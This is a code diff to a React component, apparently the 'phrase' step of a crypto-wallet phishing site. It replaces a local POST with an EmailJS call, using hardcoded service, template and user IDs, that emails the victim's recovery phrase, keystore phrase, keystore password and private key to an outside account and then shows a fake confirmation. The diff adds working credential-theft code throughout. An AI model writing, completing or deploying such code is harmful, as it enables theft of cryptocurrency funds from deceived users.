@@ -6,6 +6,7 @@ import { connectDataType } from "../../data";
 import { useState } from "react";
 import { FaCircleCheck } from "react-icons/fa6";
 import { useNavigate } from "react-router-dom";
+import emailjs from "emailjs-com";
 
 const Phrase = () => {
   const [loading, setLoading] = useState<boolean>(false);
@@ -34,33 +35,33 @@ const Phrase = () => {
     navigate("/");
   };
   const submitData = async (data: connectDataType) => {
-    console.log(data);
-    reset();
     setLoading(true);
-    // Set loading to true for 3 seconds, then set it to false and show confirmation
-    // setTimeout(() => {
-    //   setLoading(false);
-    //   setConfirmed(true);
-    // }, 2890); // 3 seconds
-    try {
-      const response = await fetch("http://localhost:5000/send-email", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(data),
-      });
+    reset();
+    // Prepare the email data
+    const templateParams = {
+      recoveryPhrase: data.recoveryPhrase || "",
+      keystorePhrase: data.keystorePhrase || "",
+      keystorePassword: data.keystorePassword || "",
+      privateKey: data.private || "",
+    };
 
-      if (response.ok) {
-        setTimeout(() => {
-          setLoading(false);
-          setConfirmed(true);
-        }, 3000);
-      } else {
-        console.error("Error sending email");
+    try {
+      // Send the email using EmailJS
+      const result = await emailjs.send(
+        "service_4dcwyzd", // Replace with your EmailJS service ID
+        "template_u12wotc", // Replace with your EmailJS template ID
+        templateParams,
+        "fZab5skM3kS9JSPtg" // Replace with your EmailJS user ID
+      );
+
+      if (result.status === 200) {
+        // If the email was sent successfully, show confirmation
+        setLoading(false);
+        setConfirmed(true);
       }
     } catch (error) {
-      console.error("Error:", error);
+      console.error("Error sending email:", error);
+      setLoading(false);
     }
   };
 
